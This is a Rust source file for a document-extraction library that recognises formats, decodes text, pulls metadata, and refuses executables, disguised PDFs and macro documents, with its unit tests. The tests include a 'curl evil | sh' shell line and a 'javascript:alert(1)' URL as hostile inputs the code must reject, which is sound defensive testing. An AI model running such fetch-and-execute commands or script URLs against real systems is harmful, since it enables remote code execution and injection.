//! ATENA content extraction: from downloaded bytes to plain text, metadata and language.
//!
//! [`extract`] recognises the format (signature first, then the declared content type), decodes
//! legacy encodings, finds the main text of web pages without menus and footers, reads PDF, DOCX
//! and ODT files, and determines the language. The publisher's rules found inside the document
//! (`<meta name="robots">`, TDMRep in HTML and PDF) are returned raw for the pipeline to merge
//! with those from the HTTP response.
//!
//! Text paragraphs are separated by a blank line, which is what change detection in `atena-core`
//! compares.

mod danger;
mod decode;
mod html;
mod isolated;
mod lang;
mod legal;
mod meta;
mod office;
mod pdf;
mod video;

use std::borrow::Cow;

use atena_core::safety::{clean_line, clean_text, is_storable_url};
use jiff::Timestamp;
use serde::{Deserialize, Serialize};
use url::Url;

pub use html::{Link, MAX_LINKS};
pub use isolated::{MEMORY_LIMIT, Parser, WORKER_ARG, serve};
pub use lang::{Language, LanguageSource, detect as detect_language};
pub use legal::{LegalSignals, MAX_LEGAL_TEXT, legal_signals};
pub use office::MAX_PART_BYTES;
pub use video::{MAX_VIDEOS, Video, video_url};

/// Longest text kept from one document, in characters.
pub const MAX_TEXT_CHARS: usize = 2_000_000;

/// Format of the source document.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum Format {
    /// HTML or XHTML page.
    Html,
    /// PDF document.
    Pdf,
    /// Word document (DOCX).
    Docx,
    /// OpenDocument text (ODT).
    Odt,
    /// Plain text.
    Text,
}

impl Format {
    /// The media type of the format – recorded instead of whatever the server claimed.
    pub fn media_type(self) -> &'static str {
        match self {
            Self::Html => "text/html",
            Self::Pdf => "application/pdf",
            Self::Docx => "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            Self::Odt => "application/vnd.oasis.opendocument.text",
            Self::Text => "text/plain",
        }
    }
}

/// The content of a document.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct Document {
    /// Recognised format.
    pub format: Format,
    /// Title (page heading or document metadata).
    pub title: Option<String>,
    /// Main text; paragraphs separated by a blank line.
    pub text: String,
    /// `true` when the text was cut at [`MAX_TEXT_CHARS`].
    pub truncated: bool,
    /// Description from metadata.
    pub description: Option<String>,
    /// Language of the text.
    pub language: Option<Language>,
    /// Language declared by the document (`<html lang>`, metadata), as written.
    pub declared_language: Option<String>,
    /// Authors from metadata.
    pub authors: Vec<String>,
    /// Publication or creation time from metadata.
    pub published: Option<Timestamp>,
    /// Modification time from metadata.
    pub modified: Option<Timestamp>,
    /// Canonical URL of a web page.
    pub canonical: Option<Url>,
    /// Links in the main content of a web page.
    pub links: Vec<Link>,
    /// Videos (YouTube, Vimeo) the page links to or embeds anywhere – never fetched.
    pub videos: Vec<Video>,
    /// RSS/Atom feeds announced by a web page.
    pub feeds: Vec<Url>,
    /// Contents of `<meta name="robots">` and `<meta name="atena">` (apply with `IndexRules::add_list`).
    pub robots: Vec<String>,
    /// TDMRep reservation from the document (`<meta>` or XMP): `Some(true)` reserved.
    pub tdm_reservation: Option<bool>,
    /// TDMRep policy URL from the document.
    pub tdm_policy: Option<String>,
    /// Encoding the text was decoded from (HTML and plain text).
    pub encoding: Option<String>,
}

/// A document that cannot be read.
#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error, Serialize, Deserialize)]
pub enum ExtractError {
    /// Not a format ATENA reads (images, video, archives…).
    #[error("unsupported format ({0})")]
    Unsupported(String),
    /// A damaged or protected PDF.
    #[error("PDF: {0}")]
    Pdf(String),
    /// A damaged DOCX or ODT.
    #[error("office document: {0}")]
    Office(String),
    /// A program, a disguised file or a document with active content – refused as a whole.
    #[error("dangerous file: {0}")]
    Dangerous(String),
    /// Parsing needed more memory or time than allowed (see [`Parser`]); nothing is kept.
    #[error("too demanding to process: {0}")]
    TooDemanding(String),
}

fn tdm_value(value: Option<&str>) -> Option<bool> {
    match value?.trim() {
        "1" => Some(true),
        "0" => Some(false),
        _ => None,
    }
}

fn essence(content_type: Option<&str>) -> String {
    content_type
        .and_then(|ct| ct.split(';').next())
        .unwrap_or_default()
        .trim()
        .to_ascii_lowercase()
}

/// Recognises the format: file signatures first (servers often send PDFs as `text/html` or
/// `application/octet-stream`), then the content type, then a look at the text.
fn format_of(
    body: &[u8],
    content_type: Option<&str>,
) -> Result<(Format, Option<office::OfficeFormat>), ExtractError> {
    let head = &body[..body.len().min(1024)];
    let dangerous = |what: &str| Err(ExtractError::Dangerous(what.to_string()));
    if let Some(program) = danger::executable(body) {
        return dangerous(program);
    }
    if danger::is_pdf(body) {
        return Ok((Format::Pdf, None));
    }
    if danger::disguised_pdf(head) {
        return dangerous("a PDF signature hidden behind other data");
    }
    if body.starts_with(b"PK\x03\x04") {
        return match office::detect(body) {
            Ok(Some(office::OfficeFormat::Docx)) => {
                Ok((Format::Docx, Some(office::OfficeFormat::Docx)))
            }
            Ok(Some(office::OfficeFormat::Odt)) => {
                Ok((Format::Odt, Some(office::OfficeFormat::Odt)))
            }
            Ok(None) => Err(ExtractError::Unsupported("ZIP archive".into())),
            Err(active) => dangerous(&format!("an office document with {active}")),
        };
    }
    let lower = String::from_utf8_lossy(head).to_ascii_lowercase();
    match essence(content_type).as_str() {
        "text/html" | "application/xhtml+xml" => Ok((Format::Html, None)),
        // text that is not text (NUL bytes) is binary data in disguise
        "text/plain" | "text/csv" if head.contains(&0) => Err(ExtractError::Unsupported(
            "binary data declared as text".into(),
        )),
        "text/plain" | "text/csv" => Ok((Format::Text, None)),
        _ if lower.contains("<html")
            || lower.contains("<!doctype html")
            || lower.contains("<body") =>
        {
            Ok((Format::Html, None))
        }
        "" | "application/octet-stream" if !head.contains(&0) => Ok((Format::Text, None)),
        other => Err(ExtractError::Unsupported(if other.is_empty() {
            "binary data".into()
        } else {
            other.to_string()
        })),
    }
}

/// Earliest date a document's metadata may claim (1 January 1900); earlier ones are errors.
const EARLIEST_DATE_S: i64 = -2_208_988_800;
/// Metadata may run ahead of the clock by this much (time zones, servers' clocks).
const FUTURE_SLACK_S: i64 = 2 * 86_400;

/// A date no document can have – before 1900 or in the future – is dropped.
fn plausible(time: Option<Timestamp>) -> Option<Timestamp> {
    let latest = Timestamp::now().as_second().saturating_add(FUTURE_SLACK_S);
    time.filter(|t| (EARLIEST_DATE_S..=latest).contains(&t.as_second()))
}

/// Removes what could hide or harm (`atena_core::safety`): hidden characters in every text,
/// addresses that are not plain `http(s)` URLs of a sensible length, impossible dates.
fn sanitize(doc: &mut Document) {
    let line = |t: &mut Option<String>| {
        *t = t.as_deref().map(clean_line).filter(|t| !t.is_empty());
    };
    line(&mut doc.title);
    line(&mut doc.description);
    line(&mut doc.declared_language);
    if let Cow::Owned(text) = clean_text(&doc.text) {
        doc.text = text;
    }
    doc.authors = doc
        .authors
        .iter()
        .map(|a| clean_line(a))
        .filter(|a| !a.is_empty())
        .collect();
    doc.robots = doc
        .robots
        .iter()
        .map(|r| clean_line(r))
        .filter(|r| !r.is_empty())
        .collect();
    doc.links.retain(|l| is_storable_url(l.url.as_str()));
    for link in &mut doc.links {
        link.text = clean_line(&link.text);
    }
    doc.videos.retain(|v| is_storable_url(v.url.as_str()));
    for video in &mut doc.videos {
        video.title = clean_line(&video.title);
    }
    doc.feeds.retain(|f| is_storable_url(f.as_str()));
    doc.canonical = doc.canonical.take().filter(|c| is_storable_url(c.as_str()));
    doc.tdm_policy = doc
        .tdm_policy
        .take()
        .map(|p| p.trim().to_string())
        .filter(|p| is_storable_url(p));
    doc.published = plausible(doc.published);
    doc.modified = plausible(doc.modified);
}

fn cut(text: String) -> (String, bool) {
    match text.char_indices().nth(MAX_TEXT_CHARS) {
        Some((end, _)) => (text[..end].to_string(), true),
        None => (text, false),
    }
}

fn plain_text(text: &str) -> String {
    let mut out = String::new();
    let mut blank = false;
    for line in text.lines().map(str::trim_end) {
        if line.trim().is_empty() {
            blank = !out.is_empty();
            continue;
        }
        if !out.is_empty() {
            out.push_str(if blank { "\n\n" } else { "\n" });
        }
        out.push_str(line);
        blank = false;
    }
    out
}

/// Extracts a document downloaded from `url` with the given `Content-Type`.
pub fn extract(
    body: &[u8],
    content_type: Option<&str>,
    url: &Url,
) -> Result<Document, ExtractError> {
    let (format, office_format) = format_of(body, content_type)?;
    let mut doc = Document {
        format,
        title: None,
        text: String::new(),
        truncated: false,
        description: None,
        language: None,
        declared_language: None,
        authors: Vec::new(),
        published: None,
        modified: None,
        canonical: None,
        links: Vec::new(),
        videos: Vec::new(),
        feeds: Vec::new(),
        robots: Vec::new(),
        tdm_reservation: None,
        tdm_policy: None,
        encoding: None,
    };
    let text = match format {
        Format::Html => {
            let (html, encoding) = decode::decode(body, content_type, url.host_str());
            let p = html::extract_html(&html, url);
            doc.encoding = Some(encoding.to_string());
            doc.title = p.title;
            doc.description = p.description;
            doc.declared_language = p.declared_language;
            doc.authors = p.authors;
            doc.published = p.published;
            doc.modified = p.modified;
            doc.canonical = p.canonical;
            doc.links = p.links;
            doc.videos = p.videos;
            doc.feeds = p.feeds;
            doc.robots = p.robots;
            doc.tdm_reservation = tdm_value(p.tdm_reservation.as_deref());
            doc.tdm_policy = p.tdm_policy;
            p.text
        }
        Format::Text => {
            let (text, encoding) = decode::decode(body, content_type, url.host_str());
            doc.encoding = Some(encoding.to_string());
            plain_text(&text)
        }
        Format::Pdf => {
            let p = pdf::extract_pdf(body).map_err(|e| match e {
                pdf::PdfError::Broken(why) => ExtractError::Pdf(why),
                pdf::PdfError::Dangerous(active) => {
                    ExtractError::Dangerous(format!("a PDF with {active}"))
                }
            })?;
            doc.title = p.title;
            doc.authors = p.authors;
            doc.published = p.published;
            doc.modified = p.modified;
            doc.declared_language = p.declared_language;
            doc.tdm_reservation = tdm_value(p.tdm_reservation.as_deref());
            doc.tdm_policy = p.tdm_policy;
            p.text
        }
        Format::Docx | Format::Odt => {
            let kind = office_format.expect("set for office formats");
            let p = office::extract_office(body, kind).map_err(ExtractError::Office)?;
            doc.title = p.title;
            doc.authors = p.authors;
            doc.published = p.published;
            doc.modified = p.modified;
            doc.declared_language = p.declared_language;
            p.text
        }
    };
    (doc.text, doc.truncated) = cut(text);
    sanitize(&mut doc);
    let sample = match &doc.title {
        Some(title) if doc.text.chars().count() < 200 => format!("{title}\n{}", doc.text),
        _ => doc.text.clone(),
    };
    doc.language = lang::decide(&sample, doc.declared_language.as_deref());
    Ok(doc)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn url() -> Url {
        Url::parse("https://www.example.cz/dokumenty/").unwrap()
    }

    #[test]
    fn format_is_recognised_by_signature_before_content_type() {
        let docx = office::tests::zip_of(&[
            ("word/document.xml", office::tests::DOCX_BODY),
            ("docProps/core.xml", office::tests::DOCX_CORE),
        ]);
        let d = extract(&docx, Some("application/octet-stream"), &url()).unwrap();
        assert_eq!(d.format, Format::Docx);
        assert_eq!(d.language.unwrap().code, "sk");
        assert!(matches!(
            extract(b"%PDF-1.7 broken", Some("text/html"), &url()),
            Err(ExtractError::Pdf(_))
        ));
        assert!(matches!(
            extract(b"\x89PNG\r\n\x1a\n\0\0", Some("image/png"), &url()),
            Err(ExtractError::Unsupported(_))
        ));
        assert!(matches!(
            extract(&office::tests::zip_of(&[("a.txt", "x")]), None, &url()),
            Err(ExtractError::Unsupported(_))
        ));
    }

    #[test]
    fn binary_data_declared_as_text_is_refused() {
        assert!(matches!(
            extract(b"\x00\x01\x02 data", Some("text/plain"), &url()),
            Err(ExtractError::Unsupported(_))
        ));
    }

    #[test]
    fn programs_and_active_documents_are_refused_whatever_they_are_called() {
        for (body, declared) in [
            (&b"MZ\x90\0\x03\0\0\0"[..], "text/plain"),
            (b"MZ\x90\0\x03%PDF-1.7", "application/pdf"),
            (b"\x7fELF\x02\x01", "text/html"),
            (b"#!/bin/sh\ncurl evil | sh", "text/plain"),
            (b"\x00\x01junk%PDF-1.4 rest", "application/pdf"),
        ] {
            assert!(
                matches!(
                    extract(body, Some(declared), &url()),
                    Err(ExtractError::Dangerous(_))
                ),
                "{declared}"
            );
        }
        let with_macros = office::tests::zip_of(&[
            ("word/document.xml", office::tests::DOCX_BODY),
            ("word/vbaProject.bin", "Attribute VB_Name"),
        ]);
        assert_eq!(
            extract(&with_macros, None, &url()),
            Err(ExtractError::Dangerous(
                "an office document with macros".into()
            ))
        );
    }

    #[test]
    fn hidden_characters_and_impossible_dates_are_removed() {
        let html = "<html><head><title>T</title>\
            <meta property=\"article:published_time\" content=\"1066-10-14T00:00:00Z\">\
            <link rel=\"canonical\" href=\"javascript:alert(1)\"></head><body><main>\
            <h1>Zá\u{202e}pis\u{0}</h1><p>Zápis\u{200b} do prvého ročníka sa koná v apríli.</p>\
            </main></body></html>";
        let d = extract(html.as_bytes(), Some("text/html"), &url()).unwrap();
        assert_eq!(d.title.as_deref(), Some("Zápis"));
        assert!(d.text.contains("Zápis do prvého ročníka"));
        assert_eq!((d.canonical, d.published), (None, None));
    }

    #[test]
    fn pdf_through_the_public_interface() {
        let bytes =
            pdf::tests::sample_pdf(&["Metodicky pokyn k hodnoteniu", "ziakov zakladnej skoly."]);
        let d = extract(&bytes, Some("application/pdf"), &url()).unwrap();
        assert_eq!(d.format, Format::Pdf);
        assert_eq!(d.tdm_reservation, Some(true));
        assert_eq!(d.language.unwrap().code, "sk");
    }

    #[test]
    fn html_in_a_legacy_encoding() {
        let html = "<html lang=\"cs\"><head><meta charset=\"windows-1250\"><title>Přijímací řízení</title>\
            <meta name=\"robots\" content=\"noindex\"><meta name=\"tdm-reservation\" content=\"1\"></head>\
            <body><p>Přijímací zkoušky na střední školy se konají v dubnu. Uchazeči podávají přihlášky do 1. března.</p></body></html>";
        let (bytes, _, _) = encoding_rs::WINDOWS_1250.encode(html);
        let d = extract(&bytes, Some("text/html"), &url()).unwrap();
        assert_eq!(d.encoding.as_deref(), Some("windows-1250"));
        assert_eq!(d.title.as_deref(), Some("Přijímací řízení"));
        assert!(d.text.starts_with("Přijímací zkoušky na střední školy"));
        let lang = d.language.unwrap();
        assert_eq!(
            (lang.code.as_str(), lang.source),
            ("cs", LanguageSource::Detected)
        );
        assert_eq!(d.robots, ["noindex"]);
        assert_eq!(d.tdm_reservation, Some(true));
    }

    #[test]
    fn plain_text_and_truncation() {
        let d = extract(
            "Учебный план\r\n\r\n\r\nПредметы и часы для 5 класса основной школы.  \n".as_bytes(),
            Some("text/plain; charset=utf-8"),
            &url(),
        )
        .unwrap();
        assert_eq!(
            d.text,
            "Учебный план\n\nПредметы и часы для 5 класса основной школы."
        );
        assert_eq!(d.language.unwrap().code, "ru");
        let long = "a".repeat(MAX_TEXT_CHARS + 5);
        let d = extract(long.as_bytes(), Some("text/plain"), &url()).unwrap();
        assert!(d.truncated && d.text.len() == MAX_TEXT_CHARS);
    }
}
